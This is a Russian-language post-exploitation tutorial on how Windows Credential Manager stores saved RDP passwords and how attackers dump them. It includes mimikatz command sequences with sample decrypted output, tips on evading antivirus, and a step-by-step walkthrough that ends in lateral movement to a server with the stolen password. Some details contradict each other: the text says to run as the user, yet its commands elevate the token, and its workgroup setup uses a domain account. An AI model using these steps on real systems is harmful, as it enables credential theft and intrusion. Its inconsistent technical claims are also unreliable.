# Сохранённые RDP-учётные данные в Windows Credentials Manager

## Учётные записи RDP и Диспетчер учётных данных Windows: определения и место в системе

**Диспетчер учётных данных Windows** ([Credential Manager](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-manager/)) — компонент ОС, предоставляющий безопасное хранилище для аутентификационной информации. Поддерживаемые типы: `Windows Credentials` (доменные), `Certificate-Based Credentials`, `Generic Credentials` и `Web Credentials`. Сохранённые пароли для подключений по протоколу [RDP](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-protocol) попадают в категорию `Generic Credentials`, где `TargetName` содержит имя удалённого сервера (например, `TERMSRV/192.168.1.100`).

Механизм сохранения активируется пользователем флажком «Запомнить меня» в клиенте MSTSC (Remote Desktop Connection). После этого учётные данные шифруются с помощью **Data Protection API (DPAPI)** в контексте текущего пользователя и сохраняются в структуру, доступную через API `CredRead()`.

В отличие от других локальных хранилищ (SAM, LSA Secrets), Credential Manager не требует привилегий `SYSTEM` — злоумышленник, работающий в сеансе жертвы, может извлечь записи без повышения прав. Поэтому извлечение RDP-учёток — типичный шаг пост-эксплуатации при горизонтальном перемещении.

| Хранилище | Привилегии для чтения | Типичное содержимое | Метод шифрования | Примеры инструментов |
|-----------|------------------------|---------------------|------------------|----------------------|
| SAM (Security Account Manager) | SYSTEM | Хеши локальных пользователей | AES-256 (начиная с Win 10 1703) | [mimikatz](https://github.com/gentilkiwi/mimikatz) `lsadump::sam` |
| LSA Secrets | SYSTEM | Пароли служб, ключи DPAPI, учётные данные планировщика | AES/SHA256 с ключом из реестра | mimikatz `lsadump::secrets` |
| Credential Manager (Vault) | Владелец сеанса (нет elevated) | Доменные пароли, Generic Credentials (в т.ч. RDP), сертификаты | DPAPI (мастер-ключ пользователя) | mimikatz `vault::cred`, `vaultcmd`, API `CredRead()` |
| Файл .RDP (сохранённые пароли) | Владелец файла | Закодированный пароль в Base64/DPAPI-обёртка | DPAPI (редко без шифрования в старых клиентах) | `cmdkey /list`, mimikatz `dpapi::cred` |
| LSASS (в памяти) | SYSTEM / Debug привилегии | Обратимые пароли, Kerberos билеты | Не шифруются в памяти | mimikatz `sekurlsa::logonpasswords` |

Представленное сравнение подчёркивает: Credential Manager — наиболее доступное для атакующего хранилище, не требующее повышения привилегий.

Для взаимодействия с хранилищем из командной строки можно воспользоваться штатной утилитой `cmdkey`, но она не показывает пароль. Полноценный обзор перечня сохранённых записей даёт `vaultcmd` (доступна в Windows 10/11), выводящая имена целей и типы хранилищ:

```cmd
vaultcmd /list
```
**Ожидаемый вывод (иллюстративная схема):**
```
Vaults in use on this machine:
  Vault: Web Credentials
  Vault: Windows Credentials

Vault: Windows Credentials contains:
  1. TERMSRV/192.168.1.100
  2. DOMAIN\user
```

Здесь `TERMSRV/192.168.1.100` — типичный префикс RDP-сохранения, добавленный MSTSC-клиентом.

## Внутреннее устройство хранилища: как шифруются и где лежат учётные записи RDP

Физически данные Credential Manager размещены в файлах каталогов `%LocalAppData%\Microsoft\Vault\` и `%RoamingAppData%\Microsoft\Vault\` текущего пользователя. Внутренними структурами управляет служба `VaultSvc.dll`. Каждый «сейф» (`Vault`) представлен файлом `*.vpol` и двоичными BLOB-ами записей, а схема шифрования полностью опирается на DPAPI.

**Ключевой механизм:** мастер-ключ (Master Key) пользователя, хранящийся в профиле (файл `%AppData%\Microsoft\Protect\{SID}\{GUID}`), шифрует ключи, используемые для защиты каждого `credential blob`. Мастер-ключ в свою очередь зашифрован хешем пароля пользователя или ключом домена (Domain Backup Key). Поэтому злоумышленник, обладающий локальным доступом к сессии, может расшифровать любые сохранённые учётные данные, просто запросив DPAPI-расшифровку от имени пользователя.

Структура записи Credential Manager описывается типом `CREDENTIALW` (Win32 API):

```c
typedef struct _CREDENTIALW {
  DWORD   Flags;
  DWORD   Type;               // CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD и др.
  LPWSTR  TargetName;         // "TERMSRV/192.168.1.100"
  LPWSTR  Comment;
  FILETIME LastWritten;
  DWORD   CredentialBlobSize;
  LPBYTE  CredentialBlob;     // зашифрованный BLOB
  DWORD   Persist;            // CRED_PERSIST_LOCAL_MACHINE и т.д.
  DWORD   AttributeCount;
  PCREDENTIAL_ATTRIBUTEW Attributes;
  LPWSTR  TargetAlias;
  LPWSTR  UserName;           // пользователь в открытом виде
} CREDENTIALW, *PCREDENTIALW;
```

Для RDP-сохранения `Type` = `CRED_TYPE_GENERIC` (1), `Persist` = `CRED_PERSIST_LOCAL_MACHINE` (2). Поле `CredentialBlob` содержит сериализованную структуру `CREDENTIAL_BLOB`, которая после DPAPI-расшифровки отдаёт пароль в открытом виде (для доменных учёток — пакет `CREDENTIAL_DOMAIN_PASSWORD_CREDENTIALW`). Расшифровать BLOB можно, только выполнив API-запрос в контексте владельца или захватив мастер-ключ и криптографические параметры.

Для демонстрации структуры хранилища можно использовать PowerShell-скрипт, обращающийся к `CredMan.ps1` (часть модуля [CredentialManager](https://www.powershellgallery.com/packages/CredentialManager/1.0.0)) или низкоуровневые вызовы C#. Следующий код подключает хранилище и выводит цели:

```powershell
# Требуется установленный модуль CredentialManager
Import-Module CredentialManager
Get-StoredCredential -AsCredentialObject -Type Generic | ForEach-Object {
    Write-Host "Target: $($_.TargetName), User: $($_.Credential.UserName)"
}
```

Однако получить открытый пароль таким способом невозможно — модуль оперирует с объектами `System.Net.NetworkCredential`, при получении которых пароль уже обрабатывается DPAPI внутри CLR.

**Путь к хранилищу** и его внутренняя иерархия представлены на схеме:

```text
Windows Credential Manager
├─ Vault: Web Credentials
│    └─ *.vpol / *.vcrd (%LocalAppData%\Microsoft\Vault\)
└─ Vault: Windows Credentials
     ├─ Запись: TERMSRV/192.168.1.100 (Generic)
     │    └─ CredentialBlob (DPAPI-шифрованный)
     └─ Запись: DOMAIN\user (Domain Password)
```

При атаке важен тот факт, что мастер-ключ DPAPI кэшируется LSASS после первого входа в систему. Поэтому извлечение ключа из дампа памяти LSASS или с помощью чтения памяти от привилегированного процесса также позволяет дешифровать все BLOB-ы без интерактивной сессии (см. mimikatz `sekurlsa::dpapi`).

## Извлечение RDP-учёток в ходе пост-эксплуатации: инструменты, техники и подводные камни

Получив доступ к сеансу пользователя (например, через bind-шелл, PowerShell Remoting или интерактивный рабочий стол), злоумышленник может извлечь сохранённые пароли RDP одним из трёх способов:

1. **Встроенная утилита `vaultcmd` и управление через графический интерфейс.**  
   Не позволяет показать пароль, но даёт перечень записей — полезно для разведки и подготовки к дальнейшему дампу с помощью специализированных средств.

2. **Использование mimikatz.**  
   Модуль `vault::cred` с параметром `/patch` на лету вносит изменения в память процесса LSASS, чтобы при вызове API `CredRead()` включить дамп пароля в открытом виде. Команда должна выполняться в контексте того же сеанса пользователя (не SYSTEM), либо mimikatz нужно сперва токен-заместить на целевого пользователя.

3. **Вызовы Win32 API в собственном коде.**  
   Написание программы на C/C++ или C#, использующей `CredReadW()`, `CredEnumerateW()`, а затем `CryptUnprotectData()` для расшифровки BLOB. Этот метод позволяет кастомизировать сбор и избежать сигнатур антивирусов. Однако его реализация сложнее, чем готовое решение.

**Практический артефакт — дамп через mimikatz** (версия 2.2.0) на Windows 10 22H2:

```bash
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # vault::list
mimikatz # vault::cred /patch
```

После выполнения `vault::cred /patch` mimikatz перебирает все Generic Credentials и выводит расшифрованные данные. Пример вывода для RDP-записи:

```text
TargetName : TERMSRV/192.168.1.100
UserName : domain\admin
Comment : 
Type : 1 - generic
Persist : 2 - local_machine
Flags : 00000008
Credential : SuperSecretPassword123
Attributes : 0
```

**Важно!** `CredentialBlob` расшифровывается именно благодаря тому, что код выполняется в пользовательском контексте и DPAPI разрешает расшифровку. При попытке сделать то же самое от имени `SYSTEM` (если нет имперсонации) API возвращает `NTE_BAD_KEY_STATE`. Это частое заблуждение новичков: получить пароль RDP напрямую из SYSTEM-контекста **невозможно** без дополнительной кражи или подстановки токена пользователя, или без оффлайн-взлома мастер-ключа.

**Альтернативный способ оффлайн-доступа** заключается в извлечении мастер-ключа DPAPI и последующей расшифровке файлов Vault. Для этого с привилегиями администратора снимается дамп LSASS или используется `mimikatz dpapi::masterkey /in:...` с паролем пользователя (если он известен) либо с использованием секрета домена. Пример команды:

```powershell
# Экспорт мастер-ключа с использованием mimikatz
mimikatz # dpapi::masterkey /in:"C:\Users\victim\AppData\Roaming\Microsoft\Protect\{sid}\{guid}" /password:123456
```

Такой подход применим, когда известен пароль пользователя или имеется доступ к доменному ключу восстановления, однако для стандартного пентеста на извлечение RDP-учёток он избыточен, так как работа в сеансе жертвы даёт всё необходимое.

**Типичные ошибки при извлечении:**
- Попытка выполнить `vault::cred` из системного шелла без имперсонации — нет расшифровки.
- Игнорирование того, что RDP-сохранения бывают в хранилище `Windows Credentials` (не `Generic Credentials`), если использовался флаг `Remember me` на доменной учётной записи — однако префикс `TERMSRV/` остаётся.
- Неправильный перехват памяти: некоторые защитные средства (например, Credential Guard) изолируют LSASS в виртуальной среде, делая `vault::cred /patch` неэффективным.
- Ложное срабатывание антивируса на mimikatz; можно использовать кастомные реализации на C# через P/Invoke `Advapi32.dll` и `Crypt32.dll`.

В ответ на Credential Guard и общие меры защиты рекомендуется применять сборщики на основе COM-интерфейса `ICredentialProvider`, но для RDP-сохранений это не даст результата — они не являются провайдерами аутентификации.

## Сквозной практический пример: извлечение пароля сохранённого RDP-подключения из контекста пользователя

**Исходные условия:**
- Операционная система: Windows 10 22H2, рабочая группа.
- Пользователь `win10_user` имеет сохранённое RDP-подключение к хосту `SRV-DC01` (IP 10.0.0.5) с доменной учётной записью `CORP\admin`.
- Мы получили удалённую сессию PowerShell Remoting на эту машину с правами того же пользователя `win10_user` (без повышения привилегий). Mimikatz предварительно загружен в `C:\temp\mimikatz.exe`.
- Задача: извлечь пароль и использовать для горизонтального перемещения на `SRV-DC01`.

### Шаг 1. Проверка наличия сохранения

```powershell
vaultcmd /list
```
**Вывод:** под хранилищем `Windows Credentials` присутствует `TERMSRV/10.0.0.5` — значит, RDP-учётка сохранена.

### Шаг 2. Запуск mimikatz и перечисление всех Generic-записей

```cmd
C:\temp\mimikatz.exe "privilege::debug" "token::elevate" "vault::list" "exit"
```
**Ожидаемый фрагмент вывода:**
```
Vault Storage:
  Vault GUID : {4BF4C442-9B8A-41A0-B380-DD4A77A2B6E3}
  Vault Name : Windows Credentials
...
  Credential 1:
    SchemaId : {GUID}
    Identity : CORP\admin
    Resource : TERMSRV/10.0.0.5
    LastWritten : 2025-03-15 11:23:45
    Persist : local_machine
    Type : generic
    Flags : 0x8
```

### Шаг 3. Получение расшифрованного пароля с помощью `/patch`

```cmd
C:\temp\mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```
**Фрагмент вывода:**
```
TargetName : TERMSRV/10.0.0.5
UserName   : CORP\admin
…
Credential : P@ssw0rd!2025
Attributes : 0
```

Плагин успешно расшифровал BLOB и вывел пароль `P@ssw0rd!2025`.

### Шаг 4. Использование полученных учётных данных

Подключимся к `SRV-DC01` с помощью PowerShell Remoting:

```powershell
$pass = ConvertTo-SecureString "P@ssw0rd!2025" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("CORP\admin", $pass)
Invoke-Command -ComputerName SRV-DC01 -Credential $cred -ScriptBlock { hostname }
```
**Вывод:**
```
SRV-DC01
```
Горизонтальное перемещение выполнено успешно.

**Вывод по теме:** пример демонстрирует, что атакующий с ограниченным доступом к сессии пользователя может без каких-либо уязвимостей ядра извлечь сохранённые учётные данные RDP, если в клиенте был включён флаг «Запомнить меня». Использование штатного API Credential Manager и инструментов дампа (mimikatz) позволяет за считанные минуты получить пароль и расширить контроль в сети.

## Источники

- [Windows Credential Manager – Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-manager/)
- [CREDENTIALW structure (wincred.h) – Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credentialw)
- [Data Protection API (DPAPI) – Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/seccng/data-protection)
- [mimikatz GitHub repository](https://github.com/gentilkiwi/mimikatz)
- [CredentialManager PowerShell module (PSGallery)](https://www.powershellgallery.com/packages/CredentialManager/1.0.0)
- [Vaultcmd – Microsoft Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vaultcmd)